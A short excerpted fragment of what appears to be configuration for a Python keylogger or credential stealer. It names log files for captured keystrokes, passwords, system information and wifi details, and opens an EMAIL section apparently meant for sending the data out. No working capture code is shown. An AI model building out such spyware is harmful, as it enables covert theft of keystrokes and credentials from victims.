...
name_id="name_id.txt"
pswd_id="pswd_id.txt"
file="LOG.txt"                                #FILE FOR KEYS
system_info="system.txt"                      #FILE NAME FOR SYSTEM INFORMATION
...
wifi_info="wifi.txt"                          #FILE NAME FOR WIFI INFORMATION
'''****************************************************************EMAIL*************************************************************************'''
